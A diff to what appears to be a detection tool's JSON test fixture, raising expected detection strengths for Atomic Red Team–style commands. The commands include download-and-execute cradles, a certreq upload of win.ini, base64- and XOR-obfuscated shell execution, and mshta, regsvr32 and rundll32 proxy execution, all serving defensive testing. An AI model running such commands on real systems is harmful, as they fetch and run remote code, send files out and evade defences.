@@ -135,7 +135,7 @@
     "(New-Object System.Net.WebClient).DownloadFile(\"https://www.example.com/redcanaryco/atomic-red-team/master/LICENSE.txt\", \"$env:TEMP\\Atomic-license.txt\")"
    ],
    "expected_min_strength": [
-    "none"
+    "medium"
    ]
   },
   {
@@ -182,7 +182,7 @@
    ],
    "expected_min_strength": [
     "none",
-    "none"
+    "strong"
    ]
   },
   {
@@ -215,7 +215,7 @@
     "finger base64_filedata@localhost"
    ],
    "expected_min_strength": [
-    "none"
+    "medium"
    ]
   },
   {
@@ -242,10 +242,10 @@
     "C:\\Windows\\System32\\Curl.exe -k https://www.example.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o %Temp%\\allthethingsx64.dll"
    ],
    "expected_min_strength": [
-    "none",
-    "none",
-    "none",
-    "none"
+    "weak",
+    "weak",
+    "weak",
+    "weak"
    ]
   },
   {
@@ -352,7 +352,7 @@
     "certreq.exe -Post -config https://example.com c:\\windows\\win.ini %temp%\\Atomic-license.txt"
    ],
    "expected_min_strength": [
-    "none"
+    "strong"
    ]
   },
   {
@@ -385,7 +385,7 @@
     "cmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\nimgrab.exe\" https://www.example.com/redcanaryco/atomic-red-team/master/LICENSE.txt $env:TEMP\\Atomic-license.txt"
    ],
    "expected_min_strength": [
-    "none"
+    "medium"
    ]
   },
   {
@@ -396,7 +396,7 @@
     "powershell.exe iwr -URI https://www.example.com/redcanaryco/atomic-red-team/master/LICENSE.txt -Outfile %temp%\\Atomic-license.txt -UseBasicParsing"
    ],
    "expected_min_strength": [
-    "none"
+    "medium"
    ]
   },
   {
@@ -411,7 +411,7 @@
    "expected_min_strength": [
     "none",
     "none",
-    "none"
+    "strong"
    ]
   },
   {
@@ -422,7 +422,7 @@
     "nscurl -k \"https://www.example.com/redcanaryco/atomic-red-team/master/LICENSE.txt\" -o \"license.txt\""
    ],
    "expected_min_strength": [
-    "none"
+    "medium"
    ]
   },
   {
@@ -556,7 +556,7 @@
     "none",
     "none",
     "none",
-    "none",
+    "strong",
     "none",
     "none",
     "none",
@@ -622,7 +622,7 @@
     "powershell.exe -exec bypass -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://www.example.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\""
    ],
    "expected_min_strength": [
-    "none"
+    "medium"
    ]
   },
   {
@@ -851,10 +851,10 @@
     "echo IyEvYmluL3NoCmVjaG8gImh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL0BhdG9taWNzb25hZnJpZGF5IEZUVyIK | b64decode -r | sh"
    ],
    "expected_min_strength": [
-    "weak",
-    "weak",
-    "weak",
-    "weak"
+    "medium",
+    "medium",
+    "medium",
+    "medium"
    ]
   },
   {
@@ -907,7 +907,7 @@
     "python3 -c 'import base64; import subprocess; xor_decrypt = lambda text, key: \"\".join([chr(c ^ ord(k)) for c, k in zip(base64.b64decode(text.encode()), key)]); command = \"AAkqKQEM\"; key = \"waEHleblxiQjoxFJQaIMLdHKz\"; exec = xor_decrypt(command, key); subprocess.call(exec, shell=True)'"
    ],
    "expected_min_strength": [
-    "none"
+    "medium"
    ]
   },
   {
@@ -1048,7 +1048,7 @@
     "mshta.exe \"about:<hta:application><script language=\"VBScript\">Close(Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run%20\"\"powershell.exe%20-nop%20-Command%20Write-Host%20Hello,%20MSHTA!;Start-Sleep%20-Seconds%205\"\"\"))</script>'\""
    ],
    "expected_min_strength": [
-    "none"
+    "medium"
    ]
   },
   {
@@ -1059,7 +1059,7 @@
     "C:\\Windows\\system32\\regsvr32.exe /s /u /i:\"PathToAtomicsFolder\\T1218.010\\src\\RegSvr32.sct\" scrobj.dll"
    ],
    "expected_min_strength": [
-    "none"
+    "strong"
    ]
   },
   {
@@ -1136,7 +1136,7 @@
     "rundll32 vbscript:\"\\..\\mshtml,#135 \"+String(CreateObject(\"WScript.Shell\").Run(\"calc.exe\"),0)"
    ],
    "expected_min_strength": [
-    "none"
+    "strong"
    ]
   },
   {
@@ -1147,7 +1147,7 @@
     "rundll32.exe advpack.dll,LaunchINFSection \"PathToAtomicsFolder\\T1218.011\\src\\T1218.011.inf\",DefaultInstall_SingleUser,1,"
    ],
    "expected_min_strength": [
-    "none"
+    "medium"
    ]
   },
   {
@@ -1158,7 +1158,7 @@
     "rundll32.exe ieadvpack.dll,LaunchINFSection \"PathToAtomicsFolder\\T1218.011\\src\\T1218.011.inf\",DefaultInstall_SingleUser,1,"
    ],
    "expected_min_strength": [
-    "none"
+    "medium"
    ]
   },
   {
@@ -1169,7 +1169,7 @@
     "rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 \"PathToAtomicsFolder\\T1218.011\\src\\T1218.011_DefaultInstall.inf\""
    ],
    "expected_min_strength": [
-    "none"
+    "medium"
    ]
   },
   {
@@ -1180,7 +1180,7 @@
     "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 \"PathToAtomicsFolder\\T1218.011\\src\\T1218.011_DefaultInstall.inf\""
    ],
    "expected_min_strength": [
-    "none"
+    "weak"
    ]
   },
   {
@@ -1192,8 +1192,8 @@
     "rundll32.exe URL.dll,FileProtocolHandler \"PathToAtomicsFolder\\T1218.011\\src\\akteullen.vbs\""
    ],
    "expected_min_strength": [
-    "none",
-    "none"
+    "medium",
+    "medium"
    ]
   },
   {
@@ -1204,7 +1204,7 @@
     "rundll32.exe pcwutl.dll,LaunchApplication %windir%\\System32\\notepad.exe"
    ],
    "expected_min_strength": [
-    "none"
+    "medium"
    ]
   },
   {
@@ -1226,7 +1226,7 @@
     "rundll32.exe \"PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx64.dll\",#2"
    ],
    "expected_min_strength": [
-    "none"
+    "medium"
    ]
   },
   {
@@ -1237,7 +1237,7 @@
     "rundll32.exe shell32.dll,Control_RunDLL \"PathToAtomicsFolder\\T1047\\bin\\calc.dll\""
    ],
    "expected_min_strength": [
-    "none"
+    "medium"
    ]
   },
   {
@@ -1250,7 +1250,7 @@
    ],
    "expected_min_strength": [
     "none",
-    "none"
+    "medium"
    ]
   },
   {
@@ -1272,7 +1272,7 @@
     "rundll32.exe url.dll,FileProtocolHandler calc.exe"
    ],
    "expected_min_strength": [
-    "none"
+    "medium"
    ]
   },
   {
@@ -1283,7 +1283,7 @@
     "rundll32.exe zipfldr.dll,RouteTheCall \"'%windir%\\System32\\calc.exe'\""
    ],
    "expected_min_strength": [
-    "none"
+    "strong"
    ]
   },
   {
@@ -1337,7 +1337,7 @@
     "set \"SYSTEMROOT=C:\\Windows\\Temp\" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://www.example.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr"
    ],
    "expected_min_strength": [
-    "none"
+    "strong"
    ]
   }
  ]
